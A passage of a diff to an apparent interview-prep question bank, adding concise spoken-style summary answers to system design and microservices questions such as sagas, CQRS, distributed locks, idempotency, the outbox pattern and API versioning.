+<p>A <strong>Bloom Filter</strong> is a space-efficient data structure that tells you:</p>
 <ul>
 <li>"Definitely NOT in the set" → <strong>100% certain</strong></li>
 <li>"Probably in the set" → <strong>might be wrong</strong> (false positive)</li>
@@ -870,7 +901,8 @@ Checking "grape":
       {
         q: 'How do you handle distributed transactions across microservices?',
         difficulty: 'hard',
-        a: `<p>In microservices, a single business operation may span multiple services/databases. You can't use a simple database transaction because each service has its own database.</p>
+        a: `<div class="interview-answer"><p>The honest first answer is: don't, if you can avoid it — redraw the service boundaries so the transaction lives inside one service. When you genuinely can't, you give up two-phase commit (a blocking, availability-killing coordinator that doesn't scale) and move to a Saga: a sequence of local transactions with compensating actions to undo on failure. That means embracing eventual consistency and designing compensations, which are business decisions — a refund, not an "un-charge." I'd pair it with the transactional outbox to publish events reliably, and make every step idempotent. The gotcha is that sagas have no isolation, so you guard intermediate states with semantic locks or status fields.</p></div>
+<p>In microservices, a single business operation may span multiple services/databases. You can't use a simple database transaction because each service has its own database.</p>
 <p><strong>Problem example:</strong></p>
 <pre>Place Order:
   1. Order Service: Create order ✅
@@ -904,7 +936,8 @@ Orchestration Saga (central coordinator):
       {
         q: 'What is the CQRS pattern (Command Query Responsibility Segregation)?',
         difficulty: 'hard',
-        a: `<p><strong>CQRS</strong> = use different models for reading and writing data.</p>
+        a: `<div class="interview-answer"><p>CQRS splits the write model from the read model so each can be optimized independently — normalized writes for correctness, denormalized read models shaped exactly for the queries. It shines when reads and writes have very different scale or shape, or in complex domains where query needs don't match the transactional model. But it isn't free: two models, usually eventual consistency between them, and more moving parts, so it's overkill for simple CRUD. It pairs naturally with event sourcing but doesn't require it. The gotcha is the read model lagging the write model — the UI has to tolerate that, or you lean on read-your-writes tricks.</p></div>
+<p><strong>CQRS</strong> = use different models for reading and writing data.</p>
 <p><strong>Analogy:</strong> A restaurant has two windows:</p>
 <ul>
 <li><strong>Order window</strong> (Command/Write): Place orders, send to kitchen</li>
@@ -936,7 +969,8 @@ Read model (denormalized, optimized for display):
       {
         q: 'How would you design a file storage system like Google Drive/Dropbox?',
         difficulty: 'hard',
-        a: `<p>A cloud file storage system needs to handle file upload/download, syncing across devices, sharing, and versioning.</p>
+        a: `<div class="interview-answer"><p>The key insight is to split metadata from the actual bytes: blobs go in object storage like S3, and a separate metadata service tracks the file tree, versions, sharing, and sync state. Files are chunked and each chunk is content-addressed by hash, which gives you deduplication, resumable uploads, and efficient delta sync where you only transfer changed chunks. Clients get pre-signed URLs straight to storage so bytes never flow through your app servers. Sync is the hard part — you need a change feed and conflict resolution for concurrent edits. The gotchas are large files, metadata consistency, and running permission checks on every share.</p></div>
+<p>A cloud file storage system needs to handle file upload/download, syncing across devices, sharing, and versioning.</p>
 <p><strong>Key components:</strong></p>
 <pre>Architecture:
   [Client Apps] → [API Gateway] → [Metadata Service] → [Metadata DB]
@@ -971,7 +1005,8 @@ Table: chunks
       {
         q: 'What is a cache stampede (thundering herd) and how do you prevent it?',
         difficulty: 'tricky',
-        a: `<p>A <strong>cache stampede</strong>: a popular cache key expires, and thousands of concurrent requests all miss at once and hit the database together — often taking it down. The nastiest version is self-inflicted: the DB slows, requests pile up, and the retry wave makes it worse.</p>
+        a: `<div class="interview-answer"><p>The problem is that when a hot key expires, thousands of concurrent requests all miss at once and stampede the database together. My go-to fix is a lock or single-flight: only one request recomputes the value while the others wait or serve stale, so the DB sees one query instead of ten thousand. Complementary tactics are probabilistic early expiration (one request refreshes just before the TTL), stale-while-revalidate, and jittering TTLs so keys don't expire in lockstep. For truly hot keys I'd pre-warm them or never let them expire passively. The related failure is cache penetration — misses for keys that don't exist — which a Bloom filter or negative caching handles.</p></div>
+<p>A <strong>cache stampede</strong>: a popular cache key expires, and thousands of concurrent requests all miss at once and hit the database together — often taking it down. The nastiest version is self-inflicted: the DB slows, requests pile up, and the retry wave makes it worse.</p>
 <pre>The scenario:
   key "home_feed" (10,000 req/s) expires at 12:00:00
   → 10,000 requests miss simultaneously
@@ -993,7 +1028,8 @@ Table: chunks
       {
         q: 'How do you generate unique IDs in a distributed system?',
         difficulty: 'hard',
-        a: `<p>Auto-increment doesn't work across many nodes. Classic trade-off question: uniqueness vs sortability vs coordination.</p>
+        a: `<div class="interview-answer"><p>The tradeoff triangle is uniqueness, sortability, and coordination cost. UUIDv4 is trivial and coordination-free but random, so it's a poor database primary key (index fragmentation) and not sortable. My usual pick is a Snowflake-style ID: a 64-bit int packing timestamp, machine ID, and a sequence — roughly time-sortable, no per-ID coordination, and compact. The catch is you must assign unique machine IDs and you depend on clocks, so clock skew or an NTP rewind can bite. If you want sortable IDs without the machine-ID setup, ULID or UUIDv7 are the modern answer. Ticket servers and DB sequences work but reintroduce a central bottleneck.</p></div>
+<p>Auto-increment doesn't work across many nodes. Classic trade-off question: uniqueness vs sortability vs coordination.</p>
 <table><tr><th>Approach</th><th>Pros</th><th>Cons</th></tr>
 <tr><td>UUID v4</td><td>No coordination, trivial</td><td>128-bit, random → terrible as B-tree PK (random inserts fragment the index), not time-sortable</td></tr>
 <tr><td>DB auto-increment</td><td>Simple, sortable</td><td>SPOF, doesn't scale writes; multi-master offset trick (1,3,5.. / 2,4,6..) is brittle</td></tr>
@@ -1012,7 +1048,8 @@ Table: chunks
       {
         q: 'Is exactly-once delivery possible in distributed systems?',
         difficulty: 'tricky',
-        a: `<p>The trick question: <strong>exactly-once <em>delivery</em> is impossible</strong> over an unreliable network — but <strong>exactly-once <em>processing</em> (effectively-once)</strong> is achievable.</p>
+        a: `<div class="interview-answer"><p>The trap is the word delivery — over an unreliable network you can't have exactly-once delivery, because the sender can never be certain its message or the ack arrived, so it must retry, which means duplicates. What you can achieve is exactly-once processing, or "effectively once": at-least-once delivery plus idempotent consumers or dedup on a unique message ID. So the real engineering is making the receiver idempotent, deduping by key, and using outbox and inbox patterns. Kafka's "exactly-once" is precisely this — idempotent producers plus transactional reads and writes within Kafka — not magic across arbitrary systems.</p></div>
+<p>The trick question: <strong>exactly-once <em>delivery</em> is impossible</strong> over an unreliable network — but <strong>exactly-once <em>processing</em> (effectively-once)</strong> is achievable.</p>
 <pre>Why delivery can't be exactly-once:
   Producer sends message → network timeout → was it received?
   - Don't retry → maybe ZERO deliveries (message lost)
@@ -1035,7 +1072,8 @@ Table: chunks
       {
         q: 'How do you implement a distributed lock? What can go wrong?',
         difficulty: 'tricky',
-        a: `<p>Naive Redis lock, and the interview is about its failure modes:</p>
+        a: `<div class="interview-answer"><p>A naive <code>SETNX</code> lock in Redis works until it doesn't, and the interview is really about the failure modes. First, always set an expiry so a crashed holder doesn't deadlock — but that creates the next problem: if your process pauses (GC, network) past the TTL, the lock expires, someone else grabs it, and now two clients believe they hold it. You mitigate with a fencing token — a monotonically increasing number the protected resource checks — so a stale holder's writes get rejected. Redlock across nodes exists but is controversial (Kleppmann's critique). The takeaway: distributed locks can't guarantee mutual exclusion under pauses, so prefer designs that don't need them — idempotency and fencing tokens.</p></div>
+<p>Naive Redis lock, and the interview is about its failure modes:</p>
 <pre>SET lock:order:42 &lt;token&gt; NX PX 30000   -- acquire: only if not exists, 30s TTL
 -- release: must be atomic check-and-delete (Lua), only if WE still own it:
 if redis.call("GET", key) == token then redis.call("DEL", key) end</pre>
@@ -1058,7 +1096,8 @@ A wakes, writes with token 33 → storage: 33 &lt; 34 → REJECTED ✅</pre>
       {
         q: 'How do you do back-of-envelope capacity estimation in a system design interview?',
         difficulty: 'medium',
-        a: `<p>Interviewers want the <em>method</em>, not precision. Round aggressively to powers of 10.</p>
+        a: `<div class="interview-answer"><p>The interviewer wants to see a structured estimate, not a precise number, so I narrate the method and round hard. I start top-down: users, then requests per user per day, divided by roughly 10^5 seconds in a day to get average QPS, then multiplied by a peak factor of 2-10x. For storage I take writes per day times bytes per record times retention; for memory I estimate the hot working set to cache. The tricks that make it fast are memorizing round numbers — a day is about 100,000 seconds, 1M requests/day is about 10 QPS — and always splitting read vs write QPS, because they drive different parts of the design. The whole point is that the numbers then justify your architecture choices.</p></div>
+<p>Interviewers want the <em>method</em>, not precision. Round aggressively to powers of 10.</p>
 <pre>Numbers to memorize:
   1 day ≈ 86,400 s ≈ 10^5 s
   1M requests/day ≈ 12 req/s   (÷ 10^5)
@@ -1085,7 +1124,8 @@ Worked example — Twitter-like service:
       {
         q: 'What are quorum reads and writes (N, R, W)?',
         difficulty: 'hard',
-        a: `<p>In leaderless replication (Dynamo, Cassandra), each value lives on <strong>N</strong> replicas. A write must be confirmed by <strong>W</strong> nodes, a read queries <strong>R</strong> nodes.</p>
+        a: `<div class="interview-answer"><p>Quorums let you tune the consistency-availability slider per operation. With N replicas, if you require R read acks and W write acks, you get strong consistency when R + W &gt; N, because the read set and write set are guaranteed to overlap on at least one up-to-date replica. So W=N, R=1 favors fast reads; W=1, R=N favors fast writes; W=R=(N/2)+1 balances both. The subtlety is that R+W&gt;N alone isn't full linearizability — you still need read-repair and version vectors to resolve concurrent writes, and sloppy quorums with hinted handoff trade correctness for availability. It's the knob behind Dynamo, Cassandra, and Riak.</p></div>
+<p>In leaderless replication (Dynamo, Cassandra), each value lives on <strong>N</strong> replicas. A write must be confirmed by <strong>W</strong> nodes, a read queries <strong>R</strong> nodes.</p>
 <pre>The quorum condition:   R + W &gt; N
 → read set and write set MUST overlap
 → at least one node in every read has the latest write
@@ -1109,7 +1149,8 @@ Tuning:
       {
         q: 'How do you prevent double payment / double charging? (idempotency in practice)',
         difficulty: 'tricky',
-        a: `<p>The scenario every payment interviewer asks: user clicks Pay, request times out, client (or user) retries. Was the first request processed? You must make the retry <strong>safe</strong>.</p>
+        a: `<div class="interview-answer"><p>The scenario is a timeout on "Pay" and a retry, and the fix is idempotency, not clever locking. The client generates an idempotency key (a UUID) once per logical payment attempt and sends it on every retry; the server records that key with the result in the same transaction as the charge. First request: process and store the keyed result. Any retry with the same key: return the stored result instead of charging again. The details that matter are storing the key atomically with the effect so a mid-way crash is safe, a uniqueness constraint to win the race between concurrent retries, and passing the key through to the payment processor too. Stripe's API works exactly this way.</p></div>
+<p>The scenario every payment interviewer asks: user clicks Pay, request times out, client (or user) retries. Was the first request processed? You must make the retry <strong>safe</strong>.</p>
 <pre>1. Client generates an idempotency key ONCE per logical action
    (UUID created when the Pay button is rendered — NOT per HTTP attempt)
 
@@ -1150,7 +1191,8 @@ Tuning:
       {
         q: 'What is microservice architecture and when should you choose it?',
         difficulty: 'medium',
-        a: `<p><strong>Microservice architecture</strong> breaks a system into small services, each owning one business capability and deployed independently.</p>
+        a: `<div class="interview-answer"><p>Microservices break a system into independently deployable services, each owning one business capability — and the real driver is organizational, letting many teams ship without stepping on each other (Conway's law). You choose it when you have that team-scaling pressure or genuinely divergent scaling and technology needs, not because it's fashionable. The costs are steep: network latency, distributed data, eventual consistency, and a heavy operational tax in observability, CI/CD, and on-call. My strong default is to start with a modular monolith and extract services along proven seams. The failure mode to avoid is a distributed monolith — services that still have to deploy together.</p></div>
+<p><strong>Microservice architecture</strong> breaks a system into small services, each owning one business capability and deployed independently.</p>
 <pre>Monolith:
   [One Big App: Users + Orders + Payments + Notifications]
 
@@ -1176,7 +1218,8 @@ Microservices:
       {
         q: 'What is service discovery in microservices?',
         difficulty: 'medium',
-        a: `<p><strong>Service discovery</strong> lets services find healthy instances of each other dynamically instead of hard-coding IP addresses.</p>
+        a: `<div class="interview-answer"><p>In a dynamic environment instances come and go constantly — autoscaling, deploys, failures — so hard-coded IPs are dead on arrival; service discovery is how a caller finds a healthy instance at runtime. There are two models: client-side, where the client queries a registry like Consul or Eureka and load-balances itself, and server-side, where it hits a stable endpoint (a load balancer or DNS) that does the routing. In Kubernetes this is mostly solved for you — a Service gives a stable DNS name and virtual IP fronting healthy pods. The linchpin is health checking: the registry must evict unhealthy instances fast or you route to dead nodes. The gotcha is stale entries and a registration storm on mass restart.</p></div>
+<p><strong>Service discovery</strong> lets services find healthy instances of each other dynamically instead of hard-coding IP addresses.</p>
 <pre>Without service discovery:
   Order Service → http://10.0.1.5:8080/payments  (hardcoded, breaks on scale)
 
@@ -1200,7 +1243,8 @@ public interface PaymentClient {
       {
         q: 'What is the difference between synchronous and asynchronous communication between services?',
         difficulty: 'medium',
-        a: `<ul>
+        a: `<div class="interview-answer"><p>Synchronous — REST or gRPC — is a request the caller blocks on; asynchronous — via a broker like Kafka or SQS — is fire-and-forget with the result arriving later or as an event. Sync is simpler to reason about and gives an immediate answer, but it creates temporal coupling: if the callee is down or slow, so is the caller, and chains of sync calls multiply latency and failure probability. Async decouples services in time and smooths load, at the cost of eventual consistency and harder debugging. My rule: sync for queries that need an immediate answer, async for commands and anything that can happen in the background. The trap is a deep synchronous call chain — a distributed monolith waiting to cascade.</p></div>
+<ul>
 <li><strong>Synchronous</strong>: Caller sends request and <strong>waits</strong> for response. REST, gRPC.</li>
 <li><strong>Asynchronous</strong>: Caller sends message and <strong>continues</strong> without waiting. Kafka, RabbitMQ, SQS.</li>
 </ul>
@@ -1221,7 +1265,8 @@ publish("order.created", { orderId: 123 })
       {
         q: 'Why is database-per-service important in microservices?',
         difficulty: 'hard',
-        a: `<p>Each service should own its own database so schema changes and deployments stay independent.</p>
+        a: `<div class="interview-answer"><p>Database-per-service is the rule that makes microservices actually independent — if two services share a database they're coupled at the schema level and can't deploy or scale separately, which is a distributed monolith. Owning your data also lets each service pick the right store (polyglot persistence) and enforces clean API boundaries, since the only way in is through the service. The price is that cross-service joins and transactions disappear, so you use API composition, replicated CQRS read models, and sagas for writes. The hardest part in practice is untangling a shared database during migration and resisting the urge to "just query the other service's tables."</p></div>
+<p>Each service should own its own database so schema changes and deployments stay independent.</p>
 <pre>❌ Shared database (distributed monolith):
   Order Service ──→ [Shared DB] ←── Payment Service
   (Schema change in orders table can break payment service!)
@@ -1245,7 +1290,8 @@ publish("order.created", { orderId: 123 })
       {
         q: 'What is the BFF pattern in microservices?',
         difficulty: 'medium',
-        a: `<p><strong>Backend for Frontend (BFF)</strong> creates a dedicated backend API layer per client type (web, mobile, IoT).</p>
+        a: `<div class="interview-answer"><p>A BFF is a dedicated API layer per client type — web, mobile, TV — that aggregates and reshapes downstream services for exactly that client's needs. It exists because a one-size-fits-all API forces mobile to over-fetch and make chatty round-trips, and because client-specific logic becomes a battleground in a shared gateway. Each frontend team owns its BFF, keeping client concerns out of the core services. The tradeoff is some duplicated aggregation across BFFs, and you have to stop the BFF from swelling into a mini-monolith with business logic that belongs downstream. GraphQL is one common way to implement the aggregation.</p></div>
+<p><strong>Backend for Frontend (BFF)</strong> creates a dedicated backend API layer per client type (web, mobile, IoT).</p>
 <pre>Without BFF:
   Mobile App ──→ [Generic API] ←── Web App
   (Mobile gets too much data, web gets too little)
@@ -1273,7 +1319,8 @@ GET /web/product/123
       {
         q: 'What is idempotency and why is it important in distributed systems?',
         difficulty: 'hard',
-        a: `<p>An operation is <strong>idempotent</strong> if performing it multiple times has the same effect as performing it once.</p>
+        a: `<div class="interview-answer"><p>Idempotency means doing the operation N times has the same effect as doing it once — and it isn't a nicety, it's mandatory, because networks force retries and every retry risks a duplicate. HTTP-wise GET, PUT, and DELETE are naturally idempotent while POST isn't, which is why create endpoints take an idempotency key the client generates once and reuses on retries, and the server dedupes on it. The implementation detail that matters is storing the key and result atomically with the side effect, so a crash between doing the work and recording the key can't double-charge. It's the foundation under safe retries, at-least-once messaging, and exactly-once processing.</p></div>
+<p>An operation is <strong>idempotent</strong> if performing it multiple times has the same effect as performing it once.</p>
 <pre>// Idempotent: safe to retry
 PUT /users/123 { name: "John" }  → Always sets name to "John"
 DELETE /orders/456               → First call deletes, retries return 404
@@ -1303,7 +1350,8 @@ if (exists(idempotencyKey)) {
       {
         q: 'What is distributed tracing and why do correlation IDs matter?',
         difficulty: 'medium',
-        a: `<p><strong>Distributed tracing</strong> follows one user request across many services, showing the full journey and timing.</p>
+        a: `<div class="interview-answer"><p>Once a request hops across a dozen services a stack trace is useless — distributed tracing reconstructs the whole journey as a tree of spans so you can see where latency and errors actually live. The mechanism is a trace/correlation ID generated at the edge and propagated through every call via headers (W3C Trace Context is the standard), with each service adding spans. Correlation IDs matter because they also stitch your logs together across services for one request — without them, debugging is archaeology. I'd standardize on OpenTelemetry exporting to something like Jaeger or Tempo. The gotcha is propagation gaps: one service that drops the header breaks the trace, and your sampling strategy decides what you can even see.</p></div>
+<p><strong>Distributed tracing</strong> follows one user request across many services, showing the full journey and timing.</p>
 <pre>User request: GET /checkout
   ↓
   [API Gateway] (2ms)
@@ -1334,7 +1382,8 @@ logger.info("[trace=abc-123] Checking inventory for item 789")</pre>
       {
         q: 'What is the Strangler Fig pattern in microservice migration?',
         difficulty: 'hard',
-        a: `<p>The <strong>Strangler Fig</strong> pattern replaces parts of a monolith gradually by routing traffic to new services one feature at a time.</p>
+        a: `<div class="interview-answer"><p>Strangler Fig is how you rewrite a monolith without a big-bang cutover — you put a proxy or facade in front, then peel off one feature at a time into new services, routing that traffic to the new code while everything else still hits the monolith. Over time the new system strangles the old one until it can be retired. The appeal is that it's incremental and reversible: each slice is small, you can roll back per route, and you never take the scary all-or-nothing leap. The gotchas are running two systems in parallel — data sync and a shared database during the transition — and having the discipline to actually finish, because half-strangled migrations that stall for years are common.</p></div>
+<p>The <strong>Strangler Fig</strong> pattern replaces parts of a monolith gradually by routing traffic to new services one feature at a time.</p>
 <pre>Phase 1: All traffic goes to monolith
   [Users] → [Monolith: Auth + Orders + Reports + Users]
 
@@ -1362,7 +1411,8 @@ Phase N: Monolith is empty → decommission it</pre>
       {
         q: 'What is the Transactional Outbox pattern?',
         difficulty: 'hard',
-        a: `<p><strong>Transactional Outbox</strong> ensures database writes and event publishing happen atomically — solving the dual-write problem.</p>
+        a: `<div class="interview-answer"><p>The outbox solves the dual-write problem: you can't atomically write to your database and publish to a broker, because they're two systems with no shared transaction. So instead, in the same local DB transaction that changes your state, you insert the event into an outbox table — now they commit or fail together. A separate relay then reads the outbox and publishes to the broker, marking rows sent, usually via change data capture like Debezium or a polling worker. This gives at-least-once publishing, so consumers must be idempotent. The gotcha is ordering and the relay's own reliability, but it beats the alternative of lost or phantom events.</p></div>
+<p><strong>Transactional Outbox</strong> ensures database writes and event publishing happen atomically — solving the dual-write problem.</p>
 <pre>// The problem: dual-write inconsistency
 1. Save order to DB ✅
 2. Publish "OrderCreated" to Kafka ❌ (network error!)
@@ -1386,7 +1436,8 @@ Table: outbox
       {
         q: 'What is the Saga pattern?',
         difficulty: 'hard',
-        a: `<p><strong>Saga</strong> manages distributed business workflows using a sequence of local transactions plus compensating actions for rollback.</p>
+        a: `<div class="interview-answer"><p>A saga gets you a multi-service business transaction without a distributed transaction: break it into local transactions, one per service, and for each step define a compensating action that semantically undoes it if a later step fails. Two flavors: choreography, where services react to each other's events — decentralized and simple for short flows but hard to follow as it grows — and orchestration, where a central coordinator drives the steps, which is clearer but adds a component. The mental shift is that you don't get rollback, you get compensation, which is a business action like issuing a refund. The gotchas are no isolation (intermediate states are visible) and making compensations idempotent and reliable.</p></div>
+<p><strong>Saga</strong> manages distributed business workflows using a sequence of local transactions plus compensating actions for rollback.</p>
 <pre>Order Saga: Create Order → Charge Payment → Reserve Inventory → Confirm
 
 If Inventory fails:
@@ -1416,7 +1467,8 @@ If failure: each service publishes compensation events
       {
         q: 'What is a service mesh and when would you use one?',
         difficulty: 'hard',
-        a: `<p>A <strong>service mesh</strong> is an infrastructure layer that handles service-to-service communication, moving networking concerns out of application code into sidecar proxies.</p>
+        a: `<div class="interview-answer"><p>A service mesh pushes cross-cutting networking concerns — mTLS, retries, timeouts, circuit breaking, traffic shifting, telemetry — out of application code and into sidecar proxies like Envoy next to each service, controlled centrally. The value is consistency and polyglot support: the same resilience and security policies across services regardless of language, without every team reimplementing them. The catch is real operational complexity and latency from the extra hops, so it's overkill for a handful of services. I'd reach for Istio or Linkerd when I have many services in many languages needing uniform mTLS and traffic policy. The gotcha is treating it as a silver bullet — it doesn't fix bad service boundaries.</p></div>
+<p>A <strong>service mesh</strong> is an infrastructure layer that handles service-to-service communication, moving networking concerns out of application code into sidecar proxies.</p>
 <pre>Without service mesh:
   Each service handles: retries, circuit breakers, mTLS, tracing, load balancing
   → Duplicated logic in every service, every language
@@ -1444,7 +1496,8 @@ With service mesh (e.g., Istio/Linkerd):
       {
         q: 'What resilience patterns are commonly used in microservices?',
         difficulty: 'hard',
-        a: `<ul>
+        a: `<div class="interview-answer"><p>The core toolkit is timeouts, retries with exponential backoff and jitter, circuit breakers, bulkheads, and fallbacks — and they work together, not in isolation. Timeouts come first, because without them a slow dependency exhausts your threads and the failure spreads; retries handle transient blips but need backoff and jitter or they become a retry storm that amplifies the outage. Circuit breakers stop you hammering a dead service and fail fast; bulkheads isolate resource pools so one struggling dependency can't sink the whole app; fallbacks degrade gracefully. The key judgment is that only idempotent operations are safe to retry, and every pattern needs tuning — badly configured resilience patterns cause outages as often as they prevent them.</p></div>
+<ul>
 <li><strong>Timeout</strong>: Don't wait forever. Set max wait time for external calls.</li>
 <li><strong>Retry</strong>: Try again on transient failures (with exponential backoff + jitter).</li>
 <li><strong>Circuit Breaker</strong>: Stop calling a failing service. Fail fast instead of cascading.</li>
@@ -1473,7 +1526,8 @@ public PaymentResult paymentFallback(PaymentRequest req, Exception ex) {
       {
         q: 'What is health checking and readiness vs liveness probes?',
         difficulty: 'medium',
-        a: `<p>Health checks tell the infrastructure whether a service instance is working correctly.</p>
+        a: `<div class="interview-answer"><p>Liveness and readiness answer two different questions, and conflating them causes real outages. Liveness asks "is this process wedged and should it be restarted?" — a failing liveness probe kills and reschedules the pod. Readiness asks "can this instance serve traffic right now?" — a failing readiness probe just pulls it out of the load balancer without killing it, which is what you want during startup, warm-up, or a temporary dependency blip. The classic bug is putting downstream dependency checks in the liveness probe: the database blips, every pod fails liveness, Kubernetes restarts them all, and a small problem becomes a full outage. Startup probes handle slow-booting apps. Keep probes cheap and local.</p></div>
+<p>Health checks tell the infrastructure whether a service instance is working correctly.</p>
 <ul>
 <li><strong>Liveness probe</strong>: "Is the process alive?" If it fails, the container is <strong>restarted</strong>.</li>
 <li><strong>Readiness probe</strong>: "Can it handle traffic?" If it fails, traffic is <strong>removed</strong> from load balancer (but container keeps running).</li>
@@ -1501,7 +1555,8 @@ readinessProbe:
       {
         q: 'What is the dual-write problem?',
         difficulty: 'tricky',
-        a: `<p>The trap behind most broken event-driven systems: a service must update its database <strong>and</strong> publish an event — and those are two systems that cannot share a transaction.</p>
+        a: `<div class="interview-answer"><p>The dual-write problem is that a service needs to update its database AND publish an event, but those are two separate systems with no shared transaction — so if one succeeds and the other fails, or the process crashes between them, you get inconsistency: a state change with no event, or an event for a change that rolled back. You can't fix this by reordering or with try/catch; there's always a crash window. The correct fix is to make it a single write — the transactional outbox (write the event into an outbox table in the same DB transaction, relay it later) or change data capture off the DB log. It's the root cause behind most "the event never fired" bugs in event-driven systems.</p></div>
+<p>The trap behind most broken event-driven systems: a service must update its database <strong>and</strong> publish an event — and those are two systems that cannot share a transaction.</p>
 <pre>// ❌ The broken code that looks fine in review:
 @Transactional
 public void createOrder(Order order) {
@@ -1526,7 +1581,8 @@ Failure modes:
       {
         q: 'What is a distributed monolith? What are the warning signs?',
         difficulty: 'tricky',
-        a: `<p>A <strong>distributed monolith</strong> has microservice <em>costs</em> (network, ops, partial failure) with monolith <em>coupling</em> — the worst of both worlds. It's what most failed microservice migrations produce.</p>
+        a: `<div class="interview-answer"><p>A distributed monolith is the worst of both worlds: you've paid the microservices tax — network hops, partial failure, ops overhead — but kept monolith coupling, so services still have to deploy together. The warning signs are concrete: a change in one service forces coordinated releases of others; services share a database; a deep synchronous call chain where one service down breaks everything; shared libraries version-bumped in lockstep; and no ability to deploy a service independently. The root cause is almost always splitting along technical layers, or splitting too early before you understood the domain. The fix is to redraw boundaries around business capabilities and decouple with async events and stable API contracts — or honestly, merge them back.</p></div>
+<p>A <strong>distributed monolith</strong> has microservice <em>costs</em> (network, ops, partial failure) with monolith <em>coupling</em> — the worst of both worlds. It's what most failed microservice migrations produce.</p>
 <p><strong>Warning signs checklist:</strong></p>
 <ul>
 <li><strong>Lockstep deploys</strong>: releasing service A requires releasing B and C at the same time (shared release train).</li>
@@ -1544,7 +1600,8 @@ without asking any other team?"  No → distributed monolith.</pre>
       {
         q: 'When do retries make an outage worse? (retry storms, backoff, jitter)',
         difficulty: 'tricky',
-        a: `<p>Retries are a load <em>amplifier</em>. During a partial outage, naive retries multiply traffic exactly when the system can least afford it — often converting a slowdown into a total collapse.</p>
+        a: `<div class="interview-answer"><p>The counterintuitive point is that retries amplify load exactly when the system can least handle it: a dependency slows, every caller retries, offered load multiplies, and you turn a partial slowdown into total collapse that cascades layer by layer. The fixes are exponential backoff to spread retries out, jitter so clients don't retry in synchronized waves, and a retry budget or circuit breaker to cap total retry volume. Crucially you only retry idempotent operations, and you don't retry at every layer — retrying at multiple tiers multiplies exponentially. The gotcha most people miss is the synchronized retry wave (thundering herd); jitter is the cheap fix that matters most.</p></div>
+<p>Retries are a load <em>amplifier</em>. During a partial outage, naive retries multiply traffic exactly when the system can least afford it — often converting a slowdown into a total collapse.</p>
 <pre>The amplification math (3 attempts per layer):
   Client → Gateway → Service A → Service B (struggling)
   3 × 3 × 3 = 27× load on B during ITS worst moment
@@ -1571,7 +1628,8 @@ Rules:
       {
         q: 'How do you decide service boundaries when splitting a monolith?',
         difficulty: 'hard',
-        a: `<p>The hardest microservices question because there's no formula — interviewers want your <em>heuristics</em>.</p>
+        a: `<div class="interview-answer"><p>There's no formula, so I lead with heuristics. I draw boundaries around business capabilities and bounded contexts (DDD), not technical layers — a service should own a cohesive chunk of the domain and its data end to end. The best test is data and change: things that change together belong together, and a good boundary minimizes chatty cross-service calls and shared data. I also weight team ownership via Conway's law — a boundary that needs three teams to coordinate is wrong. The signs I got it wrong are distributed transactions everywhere, constant cross-service joins, and changes that ripple across services. When unsure, err toward coarser services: merging is easy, splitting a wrong boundary is painful.</p></div>
+<p>The hardest microservices question because there's no formula — interviewers want your <em>heuristics</em>.</p>
 <p><strong>Primary tool: DDD bounded contexts.</strong> Split along business capabilities, where the <em>language changes meaning</em>:</p>
 <pre>"Product" means different things per context:
   Catalog   : name, images, description, SEO
@@ -1594,7 +1652,8 @@ Rules:
       {
         q: 'How do you guarantee event ordering in event-driven microservices?',
         difficulty: 'tricky',
-        a: `<p>Trick premise alert: there is <strong>no global ordering</strong> in a distributed system — the real question is <em>what scope of ordering do you actually need?</em> Usually: per entity.</p>
+        a: `<div class="interview-answer"><p>The trick is the premise: there's no global ordering in a distributed system, so the real question is what scope of ordering you actually need — and it's almost always per-entity, not global. The standard technique is to partition by that entity key (Kafka partition by account ID) so all events for one entity land on one partition and are consumed in order, while different entities parallelize freely. If you truly can't guarantee order, make consumers order-tolerant: attach a version or sequence number and drop or reorder stale events. Global total ordering forces everything through one partition and kills throughput, so you avoid needing it. The gotcha is that changing the partition key mid-stream breaks ordering.</p></div>
+<p>Trick premise alert: there is <strong>no global ordering</strong> in a distributed system — the real question is <em>what scope of ordering do you actually need?</em> Usually: per entity.</p>
 <pre>Kafka's model:
   - Ordering is guaranteed ONLY within a partition
   - Same key → same partition → in order
@@ -1620,7 +1679,8 @@ Rules:
       {
         q: 'How do you join data across microservices, each with its own database?',
         difficulty: 'tricky',
-        a: `<p>The question that exposes whether database-per-service was understood: "Show orders together with customer names" — but orders and customers live in different services. <code>JOIN</code> is gone. Options:</p>
+        a: `<div class="interview-answer"><p>Since each service owns its data, the SQL <code>JOIN</code> is gone, and you pick among three options by read pattern. API composition — the caller queries each service and joins in memory — is simplest and fine at low volume, but it's N+1 and slow for large sets. The scalable answer is CQRS with a materialized read model: services publish events and a dedicated query service maintains a denormalized, pre-joined view, accepting eventual consistency. Replicating reference data is a lighter version of that. What you must not do is reach into another service's database directly — that recreates exactly the coupling database-per-service exists to prevent. My default is API composition until it hurts, then a read model.</p></div>
+<p>The question that exposes whether database-per-service was understood: "Show orders together with customer names" — but orders and customers live in different services. <code>JOIN</code> is gone. Options:</p>
 <p><strong>1. API composition (sync)</strong> — fine for small result sets:</p>
 <pre>GET /orders?userId=42        → Order Service
 GET /customers/42            → Customer Service
@@ -1644,7 +1704,8 @@ Cost : eventual consistency + view rebuild logic</pre>
       {
         q: 'How do you evolve an API without breaking consumers? (contracts and versioning)',
         difficulty: 'hard',
-        a: `<p>Independent deployability — the whole point of microservices — dies the moment an API change forces consumers to upgrade simultaneously. Compatibility discipline is what keeps it alive.</p>
+        a: `<div class="interview-answer"><p>The rule is backward compatibility, so consumers don't have to upgrade in lockstep with you. Concretely that means additive changes only — add optional fields, never rename, remove, or change the meaning of existing ones — and have consumers ignore unknown fields (the tolerant reader pattern). When a breaking change is truly unavoidable you version it (URL or header), run old and new side by side, and deprecate the old with a real timeline. Consumer-driven contract tests like Pact catch breaks in CI before they hit production. The gotcha people miss is that events are APIs too — the same discipline and schema-registry compatibility rules apply to your event payloads.</p></div>
+<p>Independent deployability — the whole point of microservices — dies the moment an API change forces consumers to upgrade simultaneously. Compatibility discipline is what keeps it alive.</p>
 <pre>SAFE (backward-compatible):          BREAKING:
   + add optional field to response     - remove/rename a field
   + add optional request param         - change a field's type/format
@@ -1679,7 +1740,8 @@ Provider's CI replays every consumer contract against the real service
       {
         q: 'What is JWT and what are its three parts?',
         difficulty: 'easy',
-        a: `<p><strong>JWT (JSON Web Token)</strong> is a compact, URL-safe token format for securely transmitting claims between parties.</p>
